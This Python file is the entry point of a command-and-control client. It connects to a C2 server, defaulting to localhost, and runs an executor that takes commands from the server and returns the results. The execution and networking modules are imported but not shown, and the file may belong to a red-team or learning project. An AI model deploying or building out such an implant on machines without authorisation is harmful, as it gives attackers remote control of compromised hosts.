import asyncio
import logging
import uuid
import argparse
from models.communication_manager import CommunicationManager
from models.command_executor import CommandExecutor
import helper.helper_funcs as helper_funcs

# ==================== CONFIGURATION ====================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s|%(funcName)s:%(lineno)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CORE C2 CLIENT LOGIC ====================


class C2Client:
    """Main C2 Client - orchestrates communication and command execution"""
    
    def __init__(self, server_host: str, server_port: int, client_id: str):
        self.client_id = client_id
        self.communication_manager = CommunicationManager(server_host, server_port, client_id)
        self.executor = CommandExecutor()
        self._executor_task = None

    async def start(self):
        """Start the C2 client"""
        logger.info(f"Starting C2 client (ID: {self.client_id})")
        try:
            # Start executor and communication in parallel
            self._executor_task = asyncio.create_task(
                self.executor.start(
                    self.communication_manager.command_queue,
                    self.communication_manager.result_queue
                ),
                name='executor'
            )
            await self.communication_manager.start_communication()

            # Check if executor was killed
            if self.executor.is_killed:
                logger.info("Client killed by server")
            
        except asyncio.CancelledError:
            logger.info("Client cancelled")
        except Exception as e:
            logger.error(f"Client error: {e}")
        finally:
            # self.executor.stop()
            await helper_funcs.cancel_task(self._executor_task)
            logger.info("C2 Client stopped")

# ==================== MAIN ====================

async def main():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server-host", default="127.0.0.1", help="Server host")
    parser.add_argument("--server-port", type=int, default=5000, help="Server port")
    parser.add_argument("--client-id", default=None, help="Client ID (auto-generated if not provided)")

    args = parser.parse_args()

    # Generate client ID if not provided
    client_id = args.client_id or f"client-{uuid.uuid4().hex[:8]}"
    
    client = C2Client(args.server_host, args.server_port, client_id)
    
    try:
        await client.start()
    except KeyboardInterrupt:
        logger.info("Client shutdown by user")

if __name__ == "__main__":
    asyncio.run(main())